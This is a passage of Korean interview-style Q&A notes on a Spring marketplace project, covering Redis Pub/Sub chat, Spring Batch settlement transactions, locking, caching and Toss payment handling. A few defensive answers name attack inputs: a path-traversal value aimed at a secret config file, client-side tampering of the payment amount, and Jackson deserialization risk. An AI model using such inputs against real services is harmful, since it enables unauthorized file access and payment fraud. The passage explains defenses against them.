이 프로젝트에서 채팅 메시지는 DB에 먼저 저장(`messageService.saveMessage()`)한 후 Redis Pub/Sub으로 브로드캐스트한다. 메시지 유실 시 DB에서 복구 가능하므로 Redis Pub/Sub의 At-most-once 한계를 보완한다.

---

### [개념-3-2]
**Spring Batch의 `faultTolerant().skip()` 메커니즘을 설명하세요. skip 시 트랜잭션은 어떻게 처리되나요?**

**답변:**
chunk 처리 중 `skip` 대상 예외가 발생하면:
1. 현재 chunk 트랜잭션 **롤백**
2. chunk 내 아이템을 하나씩 개별 재시도(Single-item retry)
3. 각 아이템을 독립 트랜잭션으로 처리
4. 예외 발생 아이템은 skip, `SkipListener.onSkipInWrite()` 호출
5. 나머지 아이템은 정상 처리

`skipLimit`은 최대 skip 허용 횟수. 초과 시 Job 실패. 이 프로젝트에서는 `skipLimit(Integer.MAX_VALUE)`로 무제한 skip을 허용해 잔액 부족인 건이 있어도 나머지 정산을 모두 처리한다.

중요: skip 후 `SkipListener.onSkipInWrite()`에서 `settlementService.markAsInsufficient()`를 호출하는데, 이는 **롤백된 트랜잭션과 별개의 새 트랜잭션**으로 실행된다(`@Transactional`의 `REQUIRES_NEW`).

---

### [개념-3-3]
**`TransactionSynchronizationManager.registerSynchronization()`의 역할과 `afterCommit()`을 사용하는 이유를 설명하세요.**

**답변:**
트랜잭션 생명주기 이벤트에 콜백을 등록한다. `afterCommit()`은 트랜잭션이 **성공적으로 커밋된 직후** 실행된다.

사용 이유: S3 이미지 삭제, Redis Pub/Sub 메시지 발행 등 외부 시스템 작업은 **트랜잭션 롤백 시 함께 롤백되지 않는다**. 트랜잭션 내에서 외부 작업을 하면 DB는 롤백되어도 외부 작업은 이미 실행된 상태로 남아 불일치가 생긴다. `afterCommit()`을 사용하면 DB 커밋이 확정된 이후에만 외부 작업을 실행해 이 문제를 방지한다.

이 프로젝트에서 `completePurchaseAndNotify()`의 Redis Pub/Sub 전송과 `scheduleImageDeletionAfterCommit()`의 S3 삭제가 모두 `afterCommit()`에서 처리된다.

---

### [개념-3-4]
**Spring WebFlux의 `WebClient`를 Spring MVC 프로젝트에서 사용하면서 `.block()`을 호출하는 이유와 문제점을 설명하세요.**

**답변:**
`WebClient`는 본래 비동기/논블로킹 HTTP 클라이언트다. Spring MVC(Servlet 기반)에서 사용하면 이벤트 루프 스레드가 없으므로 `Mono.block()`으로 동기 처리를 강제한다.

**문제점:**
- Spring MVC 스레드 모델에서 `.block()`은 현재 요청 처리 스레드를 블록. 연결 처리 수가 많을 경우 스레드 풀 고갈 가능.
- 결제 승인처럼 반드시 결과를 기다려야 하는 경우에는 불가피.

**이 프로젝트에서의 선택 이유:** `RestTemplate`보다 유연한 설정(인터셉터, 기본 헤더, 에러 핸들링), 논블로킹 전환 시 코드 변경 최소화, Spring 5에서 `RestTemplate`이 유지보수 모드로 전환됨.

---

### [개념-3-5]
**`@EnableRedisHttpSession`이 동작하는 원리를 설명하세요. 기존 `HttpSession`이 어떻게 Redis로 교체되나요?**

**답변:**
1. `@EnableRedisHttpSession`이 `SessionRepositoryFilter`를 Spring 빈으로 등록
2. `web.xml`의 `springSessionRepositoryFilter`(`DelegatingFilterProxy`)가 이 필터를 실행
3. `SessionRepositoryFilter`가 `HttpServletRequest`를 `SessionRepositoryRequestWrapper`로 래핑
4. `request.getSession()`이 실제 `HttpSession` 대신 Redis 기반 `RedisSession`을 반환
5. 세션 데이터의 직렬화/역직렬화, TTL 관리가 모두 Redis에서 처리

결과적으로 기존 코드(`session.setAttribute`, `session.getAttribute`)를 변경하지 않고 세션 저장소가 Redis로 교체된다. `redisNamespace = "secondarybook:session"`은 Redis 키 앞에 붙는 prefix로, 여러 서비스가 같은 Redis를 공유할 때 키 충돌을 방지한다.

---

### [개념-3-6]
**낙관적 락(Optimistic Lock)과 비관적 락(Pessimistic Lock)의 차이를 설명하고, 이 프로젝트에서 어느 방식을 사용했는지 이유를 설명하세요.**

**답변:**
- **낙관적 락**: 충돌이 드물다고 가정. 버전(version) 컬럼으로 수정 시점에 충돌 감지. 충돌 시 예외 발생 후 재시도. 락을 DB에 유지하지 않아 동시성이 높다.
- **비관적 락**: 충돌이 잦다고 가정. `SELECT ... FOR UPDATE`로 조회 시점에 행 락 획득. 다른 트랜잭션이 같은 행에 접근하면 대기. 충돌 방지에 확실하나 성능 저하 가능.

이 프로젝트에서의 선택:
- **정산 처리(`SettlementItemWriter`)**: `SELECT balance FOR UPDATE`로 비관적 락. 잔액 차감은 금전 처리로 충돌 시 재시도가 불가. 정확성이 필수.
- **안전결제 요청(`requestSafePayment`)**: `UPDATE WHERE safe_payment_st = 'NONE'`으로 조건부 업데이트. UPDATE 자체가 행 락을 획득하므로 동시 요청 중 하나만 성공(낙관적 락과 유사한 효과).

---

### [프로젝트-3-1]
**채팅 메시지 전송 시 `messagingTemplate.convertAndSend()` 대신 Redis Pub/Sub을 통해 전달하는 아키텍처를 선택한 이유를 설명하세요.**

**답변:**
단일 서버에서는 `SimpMessagingTemplate.convertAndSend()`로 충분하다. 그러나 다중 서버(오토 스케일링) 환경에서는 각 서버가 독립적인 인메모리 STOMP 브로커를 가지므로, 서버 A에 연결된 사용자와 서버 B에 연결된 사용자 간에 메시지가 전달되지 않는다.

Redis Pub/Sub 아키텍처:
1. 서버 A: 메시지 수신 → DB 저장 → `ChatMessagePublisher`가 Redis `chat:messages` 채널에 발행
2. Redis: 모든 서버에 메시지 브로드캐스트
3. 서버 A, B: `ChatMessageSubscriber.onMessage()` 수신 → 연결된 클라이언트에게 `SimpMessagingTemplate.convertAndSend()`

어떤 서버에 연결된 클라이언트도 메시지를 받을 수 있다. 스케일 아웃을 고려한 설계다.

---

### [프로젝트-3-2]
**Spring Batch에서 `chunk(1)`을 선택한 이유를 설명하세요. chunk 크기가 클수록 좋은 것 아닌가요?**

**답변:**
chunk 크기가 크면 한 트랜잭션에서 더 많은 항목을 처리해 커밋 횟수가 줄어드는 장점이 있다. 그러나 정산 처리에서는 `chunk(1)`이 적합한 이유:

1. **독립 트랜잭션**: 정산 1건 = 독립 트랜잭션. 1건이 실패해도 다른 건에 영향 없음.
2. **FOR UPDATE 락 최소화**: `SELECT balance FOR UPDATE`가 1건 처리 후 즉시 커밋되어 admin_account 행 락이 빠르게 해제됨. chunk=10이면 10건 처리 동안 락이 유지됨.
3. **잔액 정합성**: 각 정산이 처리될 때마다 최신 잔액을 조회해 차감. chunk=10이면 10건을 같은 잔액 기준으로 처리할 위험이 있다.
4. **skip 단위**: chunk=1이면 skip 시 재시도 없이 바로 skip. chunk가 크면 chunk 전체 롤백 후 1건씩 재시도 과정이 발생.

---

### [프로젝트-3-3]
**`SettlementSkipListener.onSkipInWrite()`에서 `settlementService.markAsInsufficient()`를 호출할 때 별도 트랜잭션이 필요한 이유를 설명하세요.**

**답변:**
`onSkipInWrite()`는 chunk 트랜잭션이 **롤백된 후** 호출된다. 이 시점에서 원래 트랜잭션은 이미 완료(롤백)된 상태다. `markAsInsufficient()`에서 `@Transactional`로 새 트랜잭션을 시작해야 DB 업데이트가 커밋될 수 있다.

만약 `markAsInsufficient()`에 `@Transactional`이 없거나 기존 트랜잭션에 참여하면:
- 롤백된 트랜잭션 컨텍스트에서 실행되므로 DB 업데이트도 롤백됨
- 잔액 부족 건이 `INSUFFICIENT_BALANCE` 상태로 기록되지 않아 다음 배치 실행 시 동일한 건이 재처리됨

`@Transactional(propagation = REQUIRES_NEW)`를 사용해 완전히 독립된 트랜잭션으로 skip 상태를 기록한다.

---

### [프로젝트-3-4]
**`completePurchaseAndNotify()`에서 Pub/Sub 전송을 `afterCommit()`으로 처리하는 이유를 설명하세요. 트랜잭션 내부에서 바로 발행하면 어떤 문제가 생기나요?**

**답변:**
트랜잭션 내에서 Redis Pub/Sub 메시지를 발행하면:
1. 메시지가 즉시 Redis에 발행됨
2. 구독자(다른 서버 포함)가 메시지를 수신해 클라이언트에게 `[SAFE_PAYMENT_COMPLETE]` 표시
3. 이후 DB 처리 중 예외 발생 → 트랜잭션 롤백
4. **결과**: DB는 롤백되어 결제가 취소되었으나, 사용자는 이미 결제 완료 메시지를 받은 상태

`afterCommit()` 사용 시:
- DB 트랜잭션이 완전히 커밋된 이후에만 메시지 발행
- DB 롤백 시 메시지가 발행되지 않음
- 단, Pub/Sub 발행이 실패해도 트랜잭션에 영향 없음(try-catch로 감싸 로그만 기록)

---

### [프로젝트-3-5]
**`SafePaymentScheduler`가 1분마다 실행되어 만료된 안전결제를 초기화하는 방식과, 이 방식의 한계를 설명하세요.**

**답변:**
동작: 매 1분마다 `tradeMapper.resetExpiredSafePayments()`를 실행해 `safe_payment_expire_dtm < NOW()`인 `PENDING` 상태 건을 `NONE`으로 일괄 업데이트한다.

장점: 구현이 단순하고 DB 쿼리 한 번으로 처리.

한계:
1. **최대 1분 지연**: 정확히 5분 후 초기화가 아닌 최대 5분 59초(5분 만료 + 1분 스케줄 주기)가 걸릴 수 있다.
2. **다중 서버 중복 실행**: 서버가 여러 대라면 모두 동시에 같은 쿼리를 실행. DB 수준에서 UPDATE 경쟁이 발생(같은 행을 여러 서버가 업데이트 시도). 결과는 동일하지만 불필요한 DB 부하.
3. **서버 다운 시 미실행**: 서버가 다운되면 스케줄러가 실행되지 않아 만료 건이 쌓임. Redis TTL로 처리하면 서버와 무관하게 만료 처리 가능.

---

### [프로젝트-3-6]
**`TradeService.scheduleImageDeletionAfterCommit()`에서 트랜잭션이 비활성화된 경우를 체크하는 이유를 설명하세요.**

**답변:**
```java
if (TransactionSynchronizationManager.isSynchronizationActive()) {
    // afterCommit 등록
} else {
    log.warn("No active transaction, skipping image deletion");
}
```

`afterCommit()` 콜백은 활성 트랜잭션이 있을 때만 등록 가능하다. 트랜잭션이 없는 컨텍스트에서 `registerSynchronization()`을 호출하면 `IllegalStateException`이 발생한다. 메서드에 `@Transactional`이 선언되어 있으면 항상 활성 트랜잭션이 있지만, 트랜잭션 전파 설정(`NOT_SUPPORTED`, `NEVER`)이나 테스트 환경 등에서 트랜잭션 없이 호출될 수 있다. 방어적으로 체크해 런타임 에러를 방지한다.

---

### [프로젝트-3-7]
**`RedisLogoutPendingManager`에서 `pendingKey`와 `forceKey`를 분리한 설계 이유를 설명하세요.**

**답변:**
두 키는 다른 목적과 TTL을 가진다:
- `logout:pending:{type}:{seq}`: 사용자의 활동을 추적해 일정 시간 비활동 시 자동 로그아웃 대상으로 표시. TTL은 `userType.getTimeoutSeconds()`로 짧다(비활동 감지용).
- `logout:force:{type}:{seq}`: 관리자가 특정 사용자를 강제 로그아웃시킬 때 설정. TTL은 24시간(다음 활동 시 감지용).

분리 이유:
1. **의미 분리**: pending은 "비활동 감지", force는 "강제 추방"으로 목적이 다름.
2. **TTL 독립 설정**: pending과 force가 다른 만료 시간을 가져야 함.
3. **조작 독립성**: pending 제거(`removePending`)가 force 로그아웃에 영향을 주지 않음. `MemberActivityInterceptor`에서 활동 감지 시 `removePending`을 호출해도 `forceKey`는 유지됨.

---

### [프로젝트-3-8]
**`PaymentController.success()`에서 결제 금액을 클라이언트 파라미터(`amount`)가 아닌 서버에서 재계산(`serverAmount`)하는 이유를 설명하세요.**

**답변:**
클라이언트에서 전달하는 `amount`는 조작 가능하다. 예를 들어 실제 가격이 50,000원인 상품을 1원으로 수정해 Toss에 결제 요청을 보낼 수 있다. Toss는 `amount=1`로 승인하고 서버가 그대로 처리하면 1원으로 거래가 완료된다.

방어 로직:
1. `trade_seq`로 DB에서 `sale_price + delivery_cost`를 직접 계산
2. 클라이언트 `amount`와 비교
3. 불일치 시 안전결제 취소 후 실패 처리

이처럼 결제 금액은 반드시 서버 측 신뢰 데이터로 검증해야 한다. Toss API도 orderId 멱등키를 사용해 동일 결제 요청이 두 번 처리되지 않도록 한다.

---

### [프로젝트-3-9]
**`TossApiService.confirmPayment()`에서 `Idempotency-Key: orderId`를 헤더에 추가하는 이유를 설명하세요.**

**답변:**
멱등키(Idempotency Key): 동일한 키로 여러 번 요청해도 서버가 한 번만 처리함을 보장하는 키.

사용 이유:
1. **네트워크 타임아웃 방지**: 결제 승인 요청 후 응답 대기 중 타임아웃이 발생하면 동일 요청을 재전송할 수 있다. 멱등키가 없으면 중복 결제가 발생.
2. **재시도 안전성**: 서버 에러 후 재시도 시 같은 orderId로 보내면 Toss가 이미 처리된 요청으로 인식해 기존 결과를 반환.

`orderId`는 거래당 고유값으로 생성되므로 자연스럽게 멱등키 역할을 한다. 같은 orderId로 두 번 승인 요청을 보내도 Toss가 첫 번째 결과를 반환한다.

---

### [프로젝트-3-10]
**`RedisCacheConfig`의 `pubsubObjectMapper`에서 `activateDefaultTyping(BasicPolymorphicTypeValidator)`를 사용하는 이유를 설명하세요.**

**답변:**
Redis에 객체를 JSON으로 직렬화할 때 타입 정보가 없으면 역직렬화 시 어떤 클래스로 복원해야 할지 알 수 없다. `activateDefaultTyping`을 활성화하면 JSON에 클래스 타입 정보가 포함된다:
```json
["project.chat.message.MessageVO", {"chat_cont": "안녕", ...}]
```

`BasicPolymorphicTypeValidator`: `allowIfSubType("project.")`로 허용할 타입을 명시적으로 제한. `LaissezFaireSubTypeValidator`(모든 타입 허용)와 달리 역직렬화 시 임의 클래스가 인스턴스화되는 Jackson Deserialization 취약점을 방어한다.

Pub/Sub 메시지의 `payload`가 `Object` 타입이므로 역직렬화 시 타입 정보가 필요하다.

---

### [프로젝트-3-11]
**`StompConfig`에서 `enableSimpleBroker("/chatroom")`을 사용하는 이유와, 운영 환경 확장 시 고려할 사항을 설명하세요.**

**답변:**
`enableSimpleBroker`: Spring이 제공하는 인메모리 STOMP 브로커. 별도 메시지 브로커 서버 없이 서버 내부에서 구독/메시지 전달을 처리한다.

장점: 설정이 간단, 외부 의존성 없음.

운영 환경 고려사항:
1. **다중 서버**: 이미 Redis Pub/Sub으로 보완 중. 서버 간 메시지를 Redis로 브로드캐스트 후 각 서버의 `simpleBroker`가 자기 서버 클라이언트에게 전달한다.
2. **`enableStompBrokerRelay`**: RabbitMQ, ActiveMQ 같은 외부 Full-featured 브로커를 사용하면 Redis Pub/Sub 없이도 다중 서버를 지원할 수 있다. 단 외부 브로커 운영 비용이 추가된다.
3. **인메모리 브로커 재시작 시 구독 정보 유실**: 클라이언트가 재연결 후 재구독해야 함. SockJS의 heartbeat와 재연결 로직이 필요하다.

---

### [프로젝트-3-12]
**`MvcConfig.sqlSessionFactory()`에서 `config.setMapUnderscoreToCamelCase(false)`로 설정한 이유를 설명하세요.**

**답변:**
`mapUnderscoreToCamelCase=true`로 설정하면 DB 컬럼명 `member_seq`가 Java 필드 `memberSeq`로 자동 매핑된다. 그러나 이 프로젝트의 VO 필드명은 `member_seq`, `sale_title` 등 언더스코어 방식을 유지하고 있다(`@Data` + 언더스코어 필드).

언더스코어 필드명을 사용한 이유: DB 컬럼명과 동일하게 유지해 MyBatis 매퍼 XML에서 `resultType`으로 매핑할 때 별도 `resultMap` 없이 컬럼명이 필드명과 일치하도록 했다. camelCase로 바꾸면 모든 VO의 필드명과 Mapper XML의 resultMap을 전부 수정해야 한다.

---

### [프로젝트-3-13]
**`requestSafePayment()`에서 `UPDATE WHERE safe_payment_st = 'NONE'` 조건을 사용해 동시 요청 문제를 처리하는 방식을 설명하세요.**

**답변:**
```sql
UPDATE sb_trade_info
SET safe_payment_st = 'PENDING', pending_buyer_seq = #{pending_buyer_seq}, ...
WHERE trade_seq = #{trade_seq} AND safe_payment_st = 'NONE'
```

동시에 두 명의 구매자(A, B)가 같은 판매 글에서 안전결제 요청:
1. A, B 동시 UPDATE 시도
2. DB가 행 락으로 하나씩 처리: A가 먼저 `NONE → PENDING`으로 변경 후 커밋
3. B가 같은 UPDATE 시도 → `safe_payment_st = 'NONE'` 조건 불충족 → 0 rows affected
4. B: `updated = 0` → `false` 반환 → 에러 메시지 전송

추가 `@CacheEvict(value = "trade", key = "#trade_seq")`로 캐시도 즉시 무효화해 이후 조회에서 최신 상태를 반환한다.

---

### [프로젝트-3-14]
**`SettlementService.markAsInsufficient()`를 `@Transactional(propagation = REQUIRES_NEW)`로 선언해야 하는 이유를 설명하세요.**

**답변:**
`SettlementSkipListener.onSkipInWrite()`는 청크 트랜잭션이 **롤백된 후** 호출된다. 이 시점에는:
1. 현재 스레드에 활성 트랜잭션이 없거나, 롤백된 트랜잭션 컨텍스트
2. `@Transactional(propagation = REQUIRED)`만 있으면: 기존 트랜잭션에 참여 시도 → 트랜잭션 없거나 이미 롤백 마크 → `markAsInsufficient()`의 UPDATE도 커밋 안됨

`REQUIRES_NEW`: 기존 트랜잭션을 일시 중단하고 새 트랜잭션을 시작. 완전히 독립된 커밋/롤백. 정산 skip 상태(`INSUFFICIENT_BALANCE`) 기록이 원래 청크 트랜잭션과 무관하게 반드시 커밋되어야 하므로 `REQUIRES_NEW`가 필수다.

---

---

## LEVEL 4

### [개념-4-1]
**다중 서버(Scale-out) 환경에서 세션 공유 전략을 설명하고, 이 프로젝트의 방식을 평가하세요.**

**답변:**
다중 서버 세션 공유 전략:
1. **Sticky Session**: 로드밸런서가 클라이언트를 특정 서버에 고정. 세션 공유 불필요하나 서버 장애 시 세션 유실, 부하 불균등.
2. **Session Clustering**: 서버 간 세션 복제(Tomcat clustering). 서버 수 증가 시 복제 오버헤드 급증.
3. **Centralized Session Store**: Redis 같은 외부 저장소에 세션 저장. 서버가 아무리 늘어도 단일 Redis에서 세션 조회.

이 프로젝트의 평가:
- `@EnableRedisHttpSession`으로 방식 3 채택. 오토 스케일링에 적합.
- Redis가 SPOF(Single Point of Failure)가 될 수 있으나, Redis Sentinel/Cluster로 고가용성 확보 가능.
- `redisNamespace = "secondarybook:session"`으로 동일 Redis를 다른 서비스와 공유해도 충돌 없음.

---

### [개념-4-2]
**Spring Batch의 `JobInstance`, `JobExecution`, `StepExecution`의 관계를 설명하세요.**

**답변:**
- **Job**: 배치 작업 정의(설계도). 이 프로젝트에서 `settlementJob`.
- **JobInstance**: 특정 `Job` + `JobParameters`의 논리적 실행 단위. 동일 파라미터로 재실행 불가(완료 시).
- **JobExecution**: JobInstance의 실제 실행. 하나의 JobInstance가 실패 후 재실행되면 새 JobExecution 생성.
- **StepExecution**: Step의 실제 실행. `readCount`, `writeCount`, `skipCount` 등 실행 통계를 가짐.

관계: Job 1 → N JobInstance → N JobExecution → M StepExecution

이 프로젝트에서 `run.id = System.currentTimeMillis()`를 매번 파라미터에 추가해 매 배치 실행마다 새 JobInstance가 생성된다.

---

### [개념-4-3]
**`@Cacheable`과 `@CachePut`의 차이를 설명하고, 이 프로젝트에서 `@CachePut`을 사용하지 않은 이유를 설명하세요.**

**답변:**
- `@Cacheable`: 캐시에 데이터가 있으면 메서드 실행 없이 캐시 반환(캐시 히트). 없으면 실행 후 저장.
- `@CachePut`: 캐시 히트 여부와 무관하게 항상 메서드 실행 후 결과를 캐시에 저장(캐시 갱신).

이 프로젝트에서 `@CachePut` 미사용 이유:
- 수정(`modify`), 삭제(`remove`) 후 캐시를 `@CachePut`으로 갱신하려면 메서드 반환값이 캐시할 객체여야 한다. 그러나 `modify`는 `boolean`, `remove`는 `boolean`을 반환한다.
- 대신 `@CacheEvict`로 캐시를 무효화하고, 다음 조회 시 `@Cacheable`이 DB에서 최신 데이터를 로드해 캐시한다. 구현이 간단하고 오래된 캐시가 잠깐 남는 것보다 캐시 미스가 발생하는 게 데이터 정합성 측면에서 안전하다.

---

### [개념-4-4]
**`GenericJackson2JsonRedisSerializer`를 캐시 직렬화에 사용할 때 발생할 수 있는 역직렬화 실패 시나리오를 설명하세요.**

**답변:**
1. **클래스 이동/이름 변경**: 직렬화 시 `["project.trade.TradeVO", {...}]`로 저장. `TradeVO`의 패키지나 클래스명 변경 시 역직렬화에서 `ClassNotFoundException` 발생. 기존 캐시와 새 코드가 호환되지 않음.
2. **필드 타입 변경**: `int sale_price` → `Long sale_price`로 변경 시 JSON의 숫자 타입 불일치로 오류.
3. **enum 값 추가/변경**: 저장된 JSON의 enum 문자열이 현재 코드의 enum에 없으면 역직렬화 실패.
4. **`@JsonIgnore` 필드 추가**: 기존 캐시에 있는 필드가 새 코드에서 무시되거나 반대 상황.

대응책: 코드 배포 시 캐시를 미리 플러시(`@CacheEvict(allEntries=true)` 또는 Redis CLI `FLUSHDB`), 또는 캐시 키에 버전 접두사를 포함.

---

### [개념-4-5]
**`@Scheduled`를 사용하는 애플리케이션을 다중 서버로 배포할 때 발생하는 문제와 해결 방법을 설명하세요.**

**답변:**
문제: 서버 3대에 같은 애플리케이션이 배포되면 `@Scheduled` 메서드가 3대 모두에서 동시에 실행된다. `SettlementScheduler`가 3대에서 동시에 배치를 실행하면 같은 정산 건이 중복 처리될 위험이 있다.

해결 방법:
1. **ShedLock**: Redis/DB에 분산 락을 걸어 한 서버만 실행. `@SchedulerLock` 어노테이션 하나로 적용 가능.
2. **Quartz Cluster**: DB 기반 분산 스케줄러. 한 노드만 Job을 실행하도록 보장.
3. **별도 스케줄러 서버**: 스케줄러를 단독 서버에서만 실행.

이 프로젝트에서는 `SettlementItemWriter.updateToCompleted()`에 `WHERE settlement_st='REQUESTED'` 조건이 있어 중복 처리를 어느 정도 방어한다(`0 rows affected`이면 `IllegalStateException`). 그러나 ShedLock 적용이 더 명확한 해결책이다.

---

### [개념-4-6]
**STOMP 프로토콜이 WebSocket 위에서 동작하는 방식과, Spring이 STOMP를 지원하는 구조를 설명하세요.**

**답변:**
- **WebSocket**: 양방향 바이너리/텍스트 프레임 전송. 프로토콜이 매우 단순하고 어떤 데이터를 보낼지 정의하지 않음.
- **STOMP(Simple Text Oriented Messaging Protocol)**: WebSocket 위에서 동작하는 서브프로토콜. `SEND`, `SUBSCRIBE`, `MESSAGE` 등 명령어와 헤더/바디 구조를 정의.

Spring STOMP 구조:
1. 클라이언트 → `SUBSCRIBE /chatroom/1` → Spring의 Simple Broker가 구독 등록
2. 클라이언트 → `SEND /sendMessage/chat/1` + body → `@MessageMapping("/chat/{seq}")` 처리
3. `SimpMessagingTemplate.convertAndSend("/chatroom/1", msg)` → Simple Broker → 구독된 클라이언트에게 `MESSAGE` 프레임 전송

`HttpSessionHandshakeInterceptor`로 WebSocket Handshake 시 HTTP 세션을 WebSocket 세션으로 복사해 인증 정보를 유지한다.

---

### [프로젝트-4-1]
**`SettlementItemWriter`에서 `getAdminBalance FOR UPDATE` + `updateToCompleted WHERE settlement_st='REQUESTED'` 조합이 동시성을 어떻게 보장하는지 설명하세요.**

**답변:**
두 트랜잭션이 동시에 같은 정산 건을 처리하려는 시나리오:

**트랜잭션 A, B 동시 실행:**
1. A: `SELECT balance FROM admin_account WHERE seq=1 FOR UPDATE` → 행 락 획득, balance=100,000원
2. B: 같은 쿼리 → **대기** (A가 락 보유)
3. A: 잔액 확인(충분) → `UPDATE settlement SET settlement_st='COMPLETED' WHERE seq=1 AND settlement_st='REQUESTED'` → 1 row updated
4. A: `updateAdminBalance(-10,000)` → balance=90,000원 → **커밋**. 락 해제.
5. B: 락 획득, balance=90,000원 조회
6. B: `UPDATE settlement SET settlement_st='COMPLETED' WHERE seq=1 AND settlement_st='REQUESTED'` → 0 rows (이미 A가 처리) → `IllegalStateException` → Job 실패

결과: A만 처리되고 B는 중복 처리 없이 실패. 두 가지 방어가 중첩 적용된다.

---

### [프로젝트-4-2]
**`PaymentController.success()`에서 Toss 승인 후 DB 처리 실패 시 `tossApiService.cancelPayment()`를 호출하는 이유를 설명하고, 이 방식의 한계를 설명하세요.**

**답변:**
문제 상황: Toss 결제 승인은 완료 → DB 처리 실패 → 트랜잭션 롤백 → 사용자는 결제됐으나 DB에 기록 없음(돈만 나간 상태).

해결: 예외 catch 후 `tossApiService.cancelPayment(paymentKey, "서버 오류로 자동 취소")`를 호출해 결제를 취소(환불).

한계:
1. **취소 API도 실패 가능**: 네트워크 오류, Toss 서버 장애 시 취소도 실패. 이 경우 "결제는 완료, DB에 기록 없음, 취소도 실패"라는 상태가 된다.
2. **비동기 환불 처리**: Toss의 환불 처리가 즉시 되지 않을 수 있다.
3. **보완 방법**: 실패 건을 별도 테이블에 기록하고 배치 또는 관리자가 수동 처리하는 보상 트랜잭션(Saga 패턴) 적용이 이상적.

---

### [프로젝트-4-3]
**`LaissezFaireSubTypeValidator`(RedisCacheConfig)와 `BasicPolymorphicTypeValidator`(RedisConfig pubsubObjectMapper)를 각각 다른 곳에 사용한 이유를 설명하세요.**

**답변:**
- `LaissezFaireSubTypeValidator`: 모든 타입의 역직렬화를 허용. `RedisCacheConfig`에서 사용.
- `BasicPolymorphicTypeValidator.builder().allowIfSubType("project.")...`: `project.` 패키지 하위 타입만 허용.

보안 관점에서 `LaissezFaireSubTypeValidator`는 Jackson Deserialization 취약점(CVE-2017-7525 류)에 취약하다. 캐시 데이터가 외부 입력이 아닌 내부 서버에서 생성한 값이므로 신뢰할 수 있다고 판단해 사용한 것으로 보이나, `BasicPolymorphicTypeValidator`로 교체하는 것이 더 안전하다.

Pub/Sub 메시지는 Redis에 `publish`하는 주체가 서버 내부지만, 채널 데이터를 외부에서 주입할 가능성을 고려해 명시적 타입 제한을 적용했다.

---

### [프로젝트-4-4]
**`S3Service.deleteByUrl()`에서 4단계 보안 검증을 수행하는 이유와 각 단계가 방어하는 공격을 설명하세요.**

**답변:**
1. **host 검증** (`expectedS3Host` 또는 `cloudFrontDomain`): 다른 S3 버킷이나 외부 URL의 파일을 삭제하는 SSRF 유사 공격 방어. "우리 버킷의 파일만 삭제 가능"을 강제.
2. **path null/empty 검증**: 버킷 루트 삭제 시도 차단. URL이 host만 있고 path가 없으면 버킷 전체를 가리킬 수 있다.
3. **key prefix 검증** (`images/`): 업로드는 `images/` prefix를 사용하므로 삭제도 동일 prefix만 허용. `config/`, `private/` 등 다른 경로의 파일 삭제 시도 차단.
4. **`..` path traversal 차단**: `images/../config/secret.txt` 같은 경로 탐색 공격 차단.

URL 파싱에 `URI` 클래스를 사용해 query string, fragment를 자동 분리해 파싱 우회도 방지한다.

---

### [프로젝트-4-5]
**`completePurchaseAndNotify()`에서 트랜잭션 롤백 시 채팅 메시지(`saveMessage`)도 함께 롤백되는지 설명하세요. 이것이 의도된 설계인가요?**

**답변:**
`messageService.saveMessage(completeMsg)`는 트랜잭션 내부에서 실행된다. 이후 `tradeMapper.successPurchase()`나 `settlementMapper.increaseAdminBalance()` 실패 시 전체 트랜잭션이 롤백되므로 채팅 메시지도 함께 롤백된다.

이것은 **의도된 설계**다:
- DB 처리가 실패한 상태에서 채팅방에 `[SAFE_PAYMENT_COMPLETE]` 메시지가 남으면 사용자는 결제가 완료된 것으로 오해한다.
- 트랜잭션 롤백으로 메시지도 취소되면 채팅방에 해당 메시지가 나타나지 않는다.
- Redis Pub/Sub 전송은 `afterCommit()`에서 하므로, 트랜잭션 롤백 시 Pub/Sub도 실행되지 않는다. 결제 실패 시 사용자는 아무런 완료 메시지를 받지 않는다.

---

### [프로젝트-4-6]
**`MvcConfig`에서 `@Primary`로 HikariDataSource를 등록한 이유를 설명하세요. `@Primary`가 없으면 어떤 문제가 발생하나요?**

**답변:**
Spring Batch는 `DefaultBatchConfigurer`가 컨텍스트에서 `DataSource`와 `PlatformTransactionManager`를 자동으로 찾아 사용한다. 또한 `@EnableBatchProcessing`이 내부적으로 `DataSource` 빈을 필요로 한다.

`@Primary`가 없을 경우:
- Spring 컨텍스트에 `DataSource` 타입 빈이 여러 개 있으면(`HikariDataSource`, 내부 빈 등) 어떤 빈을 주입할지 모호해 `NoUniqueBeanDefinitionException` 발생.
- `@Primary`로 `HikariDataSource`를 주 빈으로 지정하면 `@Autowired DataSource`에 자동으로 해당 빈이 주입된다.

MyBatis `SqlSessionFactory`도 `dataSource()` 메서드로 직접 주입하지만, 테스트 환경에서 H2 DataSource를 사용할 때도 `@Primary` 지정으로 올바른 빈이 주입되도록 보장한다.

---

### [프로젝트-4-7]
**`@Transactional(readOnly = true)` 서비스에서 `@CacheEvict` 메서드들이 `@Transactional`(쓰기)로 오버라이드되지 않았을 때 발생하는 문제를 설명하세요.**

**답변:**
`@CacheEvict`만 있고 `@Transactional`이 없는 메서드가 클래스 레벨 `readOnly = true` 환경에서 호출되면:
1. `readOnly = true` 트랜잭션 내에서 실행
2. 메서드 내부에서 `@Transactional` 쓰기 메서드를 호출하면 기존 `readOnly` 트랜잭션에 참여(REQUIRED 전파)
3. 읽기 전용 트랜잭션에서 INSERT/UPDATE 시도 → DB에 따라 오류 발생

이 프로젝트에서 대부분의 `@CacheEvict` 메서드는 함께 `@Transactional`이 선언되어 있다. 예: `modify()`, `remove()` 모두 `@Transactional @CacheEvict` 조합. 누락된 메서드가 있으면 데이터 변경은 실패하고 캐시만 삭제되는 불일치 상황이 발생할 수 있다.

---

### [프로젝트-4-8]
**`RedisLogoutPendingManager`에서 `@Primary`를 선언한 이유와, `InMemoryLogoutPendingManager`와의 전략 패턴 활용을 설명하세요.**

**답변:**
`LogoutPendingManager` 인터페이스를 `InMemoryLogoutPendingManager`(단일 서버)와 `RedisLogoutPendingManager`(다중 서버) 두 구현체가 구현한다.

`@Primary`를 `RedisLogoutPendingManager`에 선언해 Spring이 `LogoutPendingManager`를 주입할 때 Redis 구현체를 선택하도록 한다. 단일 서버 테스트나 Redis 없는 환경에서는 `@Primary`를 `InMemoryLogoutPendingManager`로 이동하면 코드 변경 없이 전환 가능하다(전략 패턴).

다중 서버에서 `InMemoryLogoutPendingManager`를 사용하면 서버 A에서 강제 로그아웃 설정이 서버 B에는 전파되지 않아 사용자가 서버 B에 요청 시 로그아웃이 실행되지 않는 문제가 있다.

---

### [프로젝트-4-9]
**`MvcConfig`에서 `@PropertySource("classpath:application.properties")`와 Spring의 `@Value` 주입이 올바르게 동작하려면 어떤 조건이 필요한가요?**

**답변:**
